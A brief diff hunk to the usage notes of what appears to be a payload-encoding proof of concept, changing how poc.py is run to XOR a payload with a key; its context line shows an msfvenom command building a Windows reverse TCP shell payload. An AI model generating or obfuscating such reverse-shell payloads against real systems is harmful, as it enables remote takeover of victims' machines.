@@ -19,6 +19,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=@YOUR_IP LPORT=@PORT_LISTENER -f
 You can now execute poc.py with the key you want to xor the payload :
 ```
 chmod +x poc.py
-./poc.py secret_key
+sudo python3 poc.py secret_key
 ```
 
